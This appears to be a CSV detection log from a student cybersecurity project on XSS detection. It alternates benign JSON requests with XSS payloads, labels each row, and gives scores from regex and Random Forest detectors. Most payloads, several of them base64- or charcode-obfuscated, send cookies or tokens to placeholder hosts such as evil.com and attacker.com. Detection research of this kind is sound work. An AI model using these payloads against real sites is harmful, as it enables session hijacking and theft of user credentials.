Data/Hora,IP,Payload,Indicadores_XSS,Classificacao,Probabilidade_Ataque_IA,Tipo_Deteccao
2026-05-11T16:00:38.777-03:00,10.0.0.8,"{""payload"":""<frameset onload='(new Image()).src=\""http://attacker.com/log?\""+document.cookie'>""}",10,ATAQUE,100.0%,(Regex_Redundante)
2026-05-11T16:00:39.888-03:00,192.168.0.1,"{""admin_msg"":""Favor revisar os logs de acesso da rede interna.""}",0,NORMAL,26.5%,(Normal)
2026-05-11T16:00:40.999-03:00,189.5.5.5,"{""nome"":""<svg><animatetransform onbegin=fetch('http://evil.com/'+document.cookie)>""}",8,ATAQUE,82.3%,(Regex_Redundante)
2026-05-11T16:00:41.111-03:00,192.168.1.10,"{""url"":""https://ifsp.edu.br/tcc"",""status"":""submitted""}",1,NORMAL,84.8%,(Normal)
2026-05-11T16:00:42.222-03:00,10.0.0.5,"{""nome"":""<script/src='//attacker.com/x.js'></script>""}",6,ATAQUE,93.2%,(Random_Forest)
2026-05-11T16:00:43.333-03:00,172.16.0.1,"{""nome"":""Amanda Oliveira"",""email"":""amanda88@provedor.com.br""}",0,NORMAL,17.3%,(Normal)
2026-05-11T16:00:44.444-03:00,189.55.1.4,"{""msg"":""<details/ontoggle='(new(Image)).src=\""//evil.com/\""+document.cookie'>""}",7,ATAQUE,97.6%,(Regex_Redundante)
2026-05-11T16:00:45.555-03:00,192.168.1.15,"{""log"":""Memory usage: 450MB / 8000MB""}",0,NORMAL,83.9%,(Normal)
2026-05-11T16:00:46.666-03:00,10.0.0.8,"{""xss"":""<img src=x:one onerror=eval(atob('ZmV0Y2goImh0dHA6Ly9hdHRhY2tlci5jb20iK2RvY3VtZW50LmNvb2tpZSk='))>""}",9,ATAQUE,100.0%,(Regex_Redundante)
2026-05-11T16:00:47.777-03:00,177.44.22.10,"{""search"":""como configurar vscode para python 3.11""}",0,NORMAL,17.4%,(Normal)
2026-05-11T16:00:48.888-03:00,187.1.55.99,"{""nome"":""<math><mtext><option><fake><script>fetch(\""//evil.com\"")</script>""}",7,ATAQUE,96.5%,(Regex_Redundante)
2026-05-11T16:00:49.999-03:00,192.168.0.100,"{""sensor_data"":{""co2"":400,""temp"":22.1,""humidity"":45}}",0,NORMAL,1.5%,(Normal)
2026-05-11T16:00:50.111-03:00,10.0.0.12,"{""payload"":""<base href='javascript:fetch(\""//evil.com\"")//'>""}",8,ATAQUE,89.9%,(Regex_Redundante)
2026-05-11T16:00:51.222-03:00,172.16.1.1,"{""comment"":""Adorei o artigo sobre Redes Neurais Convolucionais!""}",0,NORMAL,28.0%,(Normal)
2026-05-11T16:00:52.333-03:00,189.10.20.30,"{""msg"":""<button/onmouseover=navigator.sendBeacon('//evil.io',document.cookie)>""}",7,ATAQUE,98.9%,(Regex_Redundante)
2026-05-11T16:00:53.444-03:00,10.0.0.1,"{""address"":{""rua"":""Sete de Setembro"",""numero"":123,""cidade"":""Indaiatuba""}}",0,NORMAL,4.5%,(Normal)
2026-05-11T16:00:54.555-03:00,177.88.99.1,"{""nome"":""<form><button formaction='javascript:fetch(\""//evil.com\"")'>Click</button></form>""}",7,ATAQUE,100.0%,(Regex_Redundante)
2026-05-11T16:00:55.666-03:00,192.168.1.1,"{""profile_update"":{""bio"":""Entusiasta de tecnologia e segurança da informação.""}}",0,NORMAL,28.0%,(Normal)
2026-05-11T16:00:56.777-03:00,10.0.0.5,"{""nome"":""<iframe/src=\""javascript:fetch('//evil.com/'+document.cookie)\"">""}",16,ATAQUE,94.9%,(Regex_Redundante)
2026-05-11T16:00:57.888-03:00,172.16.0.40,"{""order_id"":987654,""items"":[""Mouse"",""Pad"",""Webcam""]}",0,NORMAL,0.8%,(Normal)
2026-05-11T16:00:58.999-03:00,189.33.22.11,"{""payload"":""<svg/onmouseover='(new(Image)).src=\""//attacker.com/\""+localStorage.token'>""}",3,ATAQUE,83.2%,(Random_Forest)
2026-05-11T16:01:00.111-03:00,192.168.1.50,"{""help_ticket"":{""subject"":""Erro no pagamento"",""priority"":""high""}}",0,NORMAL,0.8%,(Normal)
2026-05-11T16:01:01.222-03:00,10.0.0.10,"{""nome"":""<marquee/onfinish=fetch('//evil.com/'+document.cookie)>""}",7,ATAQUE,92.7%,(Regex_Redundante)
2026-05-11T16:01:02.333-03:00,177.11.22.33,"{""weather"":{""city"":""São Paulo"",""temp"":18,""condition"":""Nublado""}}",0,NORMAL,0.8%,(Normal)
2026-05-11T16:01:03.444-03:00,192.168.0.5,"{""nome"":""<audio/src/onplaying='fetch(\""//evil.com/\""+document.cookie)'>""}",7,ATAQUE,93.1%,(Regex_Redundante)
2026-05-11T16:01:04.555-03:00,10.0.0.2,"{""notification"":""Você tem 3 novas mensagens não lidas.""}",0,NORMAL,7.7%,(Normal)
2026-05-11T16:01:05.666-03:00,189.99.88.77,"{""xss"":""<textarea/onfocus=eval(atob('ZmV0Y2goIi8vYXR0YWNrZXIuY29tLyIrZG9CdW1lbnQuY29va2llKQ=='))>""}",6,ATAQUE,99.1%,(Random_Forest)
2026-05-11T16:01:06.777-03:00,172.16.5.5,"{""project"":""Final Graduation Project - Cybersecurity""}",0,NORMAL,17.3%,(Normal)
2026-05-11T16:01:07.888-03:00,10.0.0.8,"{""css"":""<link/rel='stylesheet'/href='javascript:fetch(\""//evil.com\"")'>""}",10,ATAQUE,93.3%,(Regex_Redundante)
2026-05-11T16:01:08.999-03:00,192.168.1.5,"{""settings"":{""notifications"":true,""privacy"":""friends-only""}}",0,NORMAL,1.5%,(Normal)
2026-05-11T16:01:10.111-03:00,189.1.1.1,"{""nome"":""<table/background='javascript:navigator.sendBeacon(\""//evil.io\"")'>""}",6,ATAQUE,94.7%,(Random_Forest)
2026-05-11T16:01:11.222-03:00,177.55.44.33,"{""text"":""A inteligência artificial está mudando a forma como protegemos sistemas.""}",0,NORMAL,62.1%,(Normal)
2026-05-11T16:01:12.333-03:00,10.0.0.20,"{""nome"":""<body/onresize=fetch('//evil.com/'+document.cookie)>""}",7,ATAQUE,92.7%,(Regex_Redundante)
2026-05-11T16:01:13.444-03:00,192.168.1.100,"{""user_activity"":[{""action"":""click"",""id"":""btn-save""},{""action"":""type"",""id"":""input-name""}]}",0,NORMAL,3.9%,(Normal)
2026-05-11T16:01:14.555-03:00,10.0.0.3,"{""comment"":""<form/action='javascript:fetch(\""//evil.com\"")'><input/type='submit'>""}",7,ATAQUE,96.8%,(Regex_Redundante)
2026-05-11T16:01:15.666-03:00,172.16.0.2,"{""product_review"":{""rating"":5,""text"":""Excelente qualidade!""}}",0,NORMAL,0.8%,(Normal)
2026-05-11T16:01:16.777-03:00,189.2.2.2,"{""nome"":""<img/src=1/onmouseover=eval(String.fromCharCode(102,101,116,99,104,40,39,47,47,101,118,105,108,46,99,111,109,39,41))>""}",9,ATAQUE,98.7%,(Regex_Redundante)
2026-05-11T16:01:17.888-03:00,10.0.0.15,"{""inventory"":{""status"":""in-stock"",""warehouse"":""Sector-B""}}",0,NORMAL,1.5%,(Normal)
2026-05-11T16:01:18.999-03:00,192.168.1.25,"{""nome"":""<details/open/ontoggle=window.location.assign('//attacker.com')>""}",5,ATAQUE,94.4%,(Random_Forest)
2026-05-11T16:01:20.111-03:00,177.0.0.1,"{""login_attempt"":{""success"":false,""reason"":""wrong-password""}}",0,NORMAL,0.8%,(Normal)
2026-05-11T16:01:21.222-03:00,10.0.0.8,"{""payload"":""<frameset/onload=eval(atob('ZmV0Y2goIi8vYXR0YWNrZXIuY29tLyIrZG9jdW1lbnQuY29va2llKQ=='))>""}",9,ATAQUE,100.0%,(Regex_Redundante)
2026-05-11T16:01:22.333-03:00,192.168.0.1,"{""system_update"":""Versão 2.4.1 instalada com sucesso.""}",0,NORMAL,7.8%,(Normal)
2026-05-11T16:01:23.444-03:00,189.5.5.5,"{""nome"":""<svg/onload=fetch('//evil.com/'+document.cookie)>""}",10,ATAQUE,77.8%,(Filtro_Regex)
2026-05-11T16:01:24.555-03:00,192.168.1.10,"{""doc_id"":""TCC_IFSP_FINAL_V2.docx"",""status"":""uploaded""}",0,NORMAL,4.5%,(Normal)
2026-05-11T16:01:25.666-03:00,10.0.0.5,"{""nome"":""<script>fetch('//malicious.site/log?c='+document.cookie)</script>""}",12,ATAQUE,97.3%,(Regex_Redundante)
2026-05-11T16:01:26.777-03:00,172.16.0.1,"{""search_query"":""como tratar nulos em dataframes pandas""}",0,NORMAL,9.8%,(Normal)
2026-05-11T16:01:27.888-03:00,189.55.1.4,"{""comment"":""<img/src=x/onerror=document.location.replace('//attacker.com')>""}",7,ATAQUE,94.6%,(Regex_Redundante)
2026-05-11T16:01:28.999-03:00,192.168.1.15,"{""app_settings"":{""notifications"":{""email"":true,""push"":false}}}",0,NORMAL,1.3%,(Normal)
2026-05-11T16:01:30.111-03:00,10.0.0.8,"{""payload"":""<svg><desc><![CDATA[<script>fetch('//evil.com')</script>]]></desc></svg>""}",7,ATAQUE,88.2%,(Regex_Redundante)
2026-05-11T16:01:31.222-03:00,177.44.22.10,"{""nome"":""Carlos Eduardo Mendes"",""role"":""Professor Coorientador""}",0,NORMAL,27.9%,(Normal)
2026-05-11T16:01:32.333-03:00,187.1.55.99,"{""nome"":""<details/open/ontoggle=navigator.sendBeacon('//evil.io')>""}",2,NORMAL,93.1%,(Normal)
2026-05-11T16:01:33.444-03:00,192.168.0.100,"{""stats"":{""clicks"":150,""conversions"":12}}",0,NORMAL,1.1%,(Normal)
2026-05-11T16:01:34.555-03:00,10.0.0.12,"{""msg"":""<body/onload=fetch('//phish.me/'+document.cookie)>""}",10,ATAQUE,92.4%,(Regex_Redundante)
2026-05-11T16:01:35.666-03:00,172.16.1.1,"{""message"":""A reunião foi remarcada para as 14h na sala 302.""}",0,NORMAL,26.5%,(Normal)
2026-05-11T16:01:36.777-03:00,189.10.20.30,"{""xss"":""<audio/src/onerror=eval(atob('ZmV0Y2goImh0dHA6Ly9ldmlsLmNvbS8iKQ=='))>""}",9,ATAQUE,98.9%,(Regex_Redundante)
2026-05-11T16:01:37.888-03:00,10.0.0.1,"{""auth_status"":""authenticated"",""user_id"":456789}",0,NORMAL,0.8%,(Normal)
2026-05-11T16:01:38.999-03:00,177.88.99.1,"{""nome"":""<input/onfocus=fetch('//attacker.com')/autofocus>""}",2,NORMAL,92.7%,(Normal)
2026-05-11T16:01:40.111-03:00,192.168.1.1,"{""feedback"":""O sistema de detecção de ameaças parece muito promissor.""}",0,NORMAL,28.0%,(Normal)
2026-05-11T16:01:41.222-03:00,10.0.0.5,"{""nome"":""<video><source/onerror=fetch('//evil.com')></video>""}",5,ATAQUE,92.5%,(Random_Forest)
2026-05-11T16:01:42.333-03:00,172.16.0.40,"{""user_profile"":{""username"":""sacchi_gabriel"",""points"":1500}}",0,NORMAL,0.8%,(Normal)
2026-05-11T16:01:43.444-03:00,189.33.22.11,"{""payload"":""<marquee/onmouseover=fetch('//attacker.com')>""}",3,ATAQUE,87.1%,(Random_Forest)
2026-05-11T16:01:44.555-03:00,192.168.1.50,"{""event"":""graduation_party"",""date"":""2026-12-15""}",0,NORMAL,1.8%,(Normal)
2026-05-11T16:01:45.666-03:00,10.0.0.10,"{""nome"":""<table/background='javascript:fetch(\""//evil.com\"")'>""}",7,ATAQUE,92.8%,(Regex_Redundante)
2026-05-11T16:01:46.777-03:00,177.11.22.33,"{""comment"":""O dataset sintético ajudou muito no treinamento do modelo.""}",0,NORMAL,29.6%,(Normal)
2026-05-11T16:01:47.888-03:00,192.168.0.5,"{""nome"":""<link/rel='import'/href='//evil.com/x.html'>""}",4,ATAQUE,87.5%,(Random_Forest)
2026-05-11T16:01:48.999-03:00,10.0.0.2,"{""system"":""Ubuntu 22.04 LTS"",""kernel"":""5.15.0-generic""}",0,NORMAL,4.5%,(Normal)
2026-05-11T16:01:50.111-03:00,189.99.88.77,"{""xss"":""<a/href='javascript:fetch(\""//attacker.com\"")'>View Report</a>""}",8,ATAQUE,93.4%,(Regex_Redundante)
2026-05-11T16:01:51.222-03:00,172.16.5.5,"{""reading"":{""voltage"":220,""current"":1.5,""power"":330}}",0,NORMAL,1.5%,(Normal)
2026-05-11T16:01:52.333-03:00,10.0.0.8,"{""css"":""<style>@import'//evil.com/x.css';</style>""}",3,ATAQUE,87.0%,(Random_Forest)
2026-05-11T16:01:53.444-03:00,192.168.1.5,"{""search_results"":[{""id"":1,""title"":""Python XSS Detection""},{""id"":2,""title"":""ML in Cybersecurity""}]}",1,NORMAL,65.8%,(Normal)
2026-05-11T16:01:54.555-03:00,189.1.1.1,"{""nome"":""<object/data='javascript:fetch(\""//evil.com\"")'></object>""}",7,ATAQUE,92.8%,(Regex_Redundante)
2026-05-11T16:01:55.666-03:00,177.55.44.33,"{""note"":""Lembrar de incluir as métricas de Precision e Recall no relatório.""}",0,NORMAL,57.2%,(Normal)
2026-05-11T16:01:56.777-03:00,10.0.0.20,"{""nome"":""<embed/src='javascript:fetch(\""//evil.com\"")'></embed>""}",7,ATAQUE,94.2%,(Regex_Redundante)
2026-05-11T16:01:57.888-03:00,192.168.1.100,"{""action"":""logout"",""user_id"":998877}",0,NORMAL,1.5%,(Normal)
2026-05-11T16:01:58.999-03:00,10.0.0.3,"{""comment"":""<form/id='f' /><button/form='f'/formaction='javascript:fetch(\""//evil.com\"")'>Send</button>""}",7,ATAQUE,100.0%,(Regex_Redundante)
2026-05-11T16:02:00.111-03:00,172.16.0.2,"{""weather_update"":{""city"":""Campinas"",""temp"":25}}",0,NORMAL,1.5%,(Normal)
2026-05-11T16:02:01.222-03:00,189.2.2.2,"{""nome"":""<isindex/formaction='javascript:fetch(\""//evil.com\"")'>""}",7,ATAQUE,92.5%,(Regex_Redundante)
2026-05-11T16:02:02.333-03:00,10.0.0.15,"{""status"":""running"",""pid"":1234,""cpu_usage"":12.5}",0,NORMAL,1.5%,(Normal)
2026-05-11T16:02:03.444-03:00,192.168.1.25,"{""nome"":""<keygen/onfocus=fetch('//attacker.com')>""}",2,NORMAL,87.0%,(Normal)
2026-05-11T16:02:04.555-03:00,177.0.0.1,"{""session_id"":""a1b2c3d4e5f6g7h8i9j0"",""active"":true}",0,NORMAL,0.8%,(Normal)
2026-05-11T16:02:05.666-03:00,10.0.0.8,"{""payload"":""<frameset/onload=fetch('//evil.com')>""}",5,ATAQUE,86.8%,(Random_Forest)
2026-05-11T16:02:06.777-03:00,192.168.0.1,"{""log"":""Database migration completed at 16:00:00.""}",0,NORMAL,18.1%,(Normal)
2026-05-11T16:02:07.888-03:00,189.5.5.5,"{""nome"":""<svg/onload=eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIuY29tL3gnKQ=='))>""}",9,ATAQUE,77.8%,(Filtro_Regex)
2026-05-11T16:02:08.999-03:00,192.168.1.10,"{""user_type"":""premium"",""expiration"":""2027-01-01""}",0,NORMAL,1.5%,(Normal)
2026-05-11T16:02:10.111-03:00,10.0.0.5,"{""nome"":""<img/src=x/onerror=fetch('//evil.com/'+document.cookie)>""}",10,ATAQUE,94.9%,(Regex_Redundante)
2026-05-11T16:02:11.222-03:00,172.16.0.1,"{""task"":""Review TCC Section 4 - Methodology""}",0,NORMAL,7.9%,(Normal)
2026-05-11T16:02:12.333-03:00,189.55.1.4,"{""comment"":""<svg/onmouseover=fetch('//attacker.com')>""}",3,NORMAL,73.8%,(Normal)
2026-05-11T16:02:13.444-03:00,192.168.1.15,"{""backup_status"":""completed"",""destination"":""Cloud-Storage-1""}",0,NORMAL,0.8%,(Normal)
2026-05-11T16:02:14.555-03:00,10.0.0.8,"{""payload"":""<script>eval(String.fromCharCode(102,101,116,99,104,40,39,47,47,101,118,105,108,46,99,111,109,39,41))</script>""}",13,ATAQUE,99.4%,(Regex_Redundante)
2026-05-11T16:02:15.666-03:00,177.44.22.10,"{""coauthor"":""Rafael Souza"",""department"":""Computing""}",0,NORMAL,0.8%,(Normal)
2026-05-11T16:02:16.777-03:00,187.1.55.99,"{""nome"":""<details/open/ontoggle=eval(atob('ZmV0Y2goJy8vZXZpbC5pbycp'))>""}",7,ATAQUE,92.9%,(Regex_Redundante)
2026-05-11T16:02:17.888-03:00,192.168.0.100,"{""alert_status"":""none"",""monitoring"":true}",0,NORMAL,1.3%,(Normal)
2026-05-11T16:02:18.999-03:00,10.0.0.12,"{""msg"":""<body/onpageshow=eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIuY29tJyk='))>""}",7,ATAQUE,94.4%,(Regex_Redundante)
2026-05-11T16:02:20.111-03:00,172.16.1.1,"{""memo"":""Não esquecer da apresentação na próxima sexta-feira.""}",0,NORMAL,27.8%,(Normal)
2026-05-11T16:02:21.222-03:00,189.10.20.30,"{""xss"":""<audio/src/onerror=eval(String.fromCharCode(102,101,116,99,104,40,39,47,47,101,118,105,108,46,105,111,39,41))>""}",11,ATAQUE,98.7%,(Regex_Redundante)
2026-05-11T16:02:22.333-03:00,10.0.0.1,"{""last_login"":""2026-05-11 15:55:00""}",0,NORMAL,0.8%,(Normal)
2026-05-11T16:02:23.444-03:00,177.88.99.1,"{""nome"":""<input/onfocus=eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIuY29tJyk='))/autofocus>""}",6,ATAQUE,99.6%,(Random_Forest)
2026-05-11T16:02:24.555-03:00,192.168.1.1,"{""quote"":""Segurança não é um produto, mas um processo.""}",0,NORMAL,27.9%,(Normal)
2026-05-11T16:02:25.666-03:00,10.0.0.5,"{""nome"":""<video><source/onerror=eval(atob('ZmV0Y2goJy8vZXZpbC5jb20nKQ=='))></video>""}",9,ATAQUE,99.9%,(Regex_Redundante)
2026-05-11T16:02:26.777-03:00,172.16.0.40,"{""points_balance"":4500,""tier"":""Gold""}",0,NORMAL,1.3%,(Normal)
2026-05-11T16:02:27.888-03:00,189.33.22.11,"{""payload"":""<marquee/onmouseover=eval(atob('ZmV0Y2goJy8vYXR0YWNrZXIubmV0Jyk='))>""}",7,ATAQUE,98.7%,(Regex_Redundante)
2026-05-11T16:02:28.999-03:00,192.168.1.50,"{""reminder"":""Submeter o artigo para a conferência até amanhã.""}",0,NORMAL,26.5%,(Normal)
2026-05-11T16:02:30.111-03:00,10.0.0.10,"{""nome"":""<table/background='javascript:fetch(\""//malicious.com\"")'>""}",7,ATAQUE,93.2%,(Regex_Redundante)
2026-05-11T16:02:31.222-03:00,177.11.22.33,"{""thought"":""A detecção baseada em rede neural é muito mais eficaz que RegEx.""}",0,NORMAL,51.7%,(Normal)
2026-05-11T16:02:32.333-03:00,192.168.0.5,"{""nome"":""<link/rel='import'/href='//attacker.site/x.html'>""}",4,ATAQUE,92.7%,(Random_Forest)
2026-05-11T16:02:33.444-03:00,10.0.0.2,"{""uptime_summary"":{""days"":30,""hours"":12,""minutes"":45}}",0,NORMAL,1.3%,(Normal)
2026-05-11T16:02:34.555-03:00,189.99.88.77,"{""xss"":""<a/href='javascript:navigator.sendBeacon(\""//evil.com\"")'>Click Me</a>""}",8,ATAQUE,98.7%,(Regex_Redundante)
2026-05-11T16:02:35.666-03:00,172.16.5.5,"{""machine_stats"":{""temp"":45,""fan_speed"":2500}}",0,NORMAL,1.1%,(Normal)
2026-05-11T16:02:36.777-03:00,10.0.0.8,"{""css"":""<style>@import'//attacker.com/malicious.css';</style>""}",4,ATAQUE,92.7%,(Random_Forest)
2026-05-11T16:02:37.888-03:00,192.168.1.5,"{""results_count"":10,""query_time_ms"":12}",0,NORMAL,1.1%,(Normal)
2026-05-11T16:02:38.999-03:00,189.1.1.1,"{""nome"":""<object/data='javascript:eval(atob(\""ZmV0Y2goJy8vZXZpbC5jb20nKQ==\""))'></object>""}",11,ATAQUE,100.0%,(Regex_Redundante)
2026-05-11T16:02:40.111-03:00,177.55.44.33,"{""goal"":""Alcançar 99% de acurácia no dataset de validação.""}",0,NORMAL,92.8%,(Normal)
2026-05-11T16:02:41.222-03:00,10.0.0.20,"{""nome"":""<embed/src='javascript:eval(atob(\""ZmV0Y2goJy8vYXR0YWNrZXIuY29tJyk=\""))'></embed>""}",11,ATAQUE,100.0%,(Regex_Redundante)
2026-05-11T16:02:42.333-03:00,192.168.1.100,"{""user_pref"":{""language"":""en"",""region"":""US""}}",0,NORMAL,1.1%,(Normal)
2026-05-11T16:02:43.444-03:00,10.0.0.3,"{""comment"":""<form/action='javascript:eval(atob(\""ZmV0Y2goJy8vZXZpbC5pbycp\""))'><input/type='submit'>""}",11,ATAQUE,100.0%,(Regex_Redundante)
2026-05-11T16:02:44.555-03:00,172.16.0.2,"{""weather_condition"":""Clear Sky"",""wind_speed"":10}",0,NORMAL,1.5%,(Normal)
2026-05-11T16:02:45.666-03:00,189.2.2.2,"{""nome"":""<isindex/formaction='javascript:eval(atob(\""ZmV0Y2goJy8vYXR0YWNrZXIubmV0Jyk=\""))'>""}",11,ATAQUE,100.0%,(Regex_Redundante)
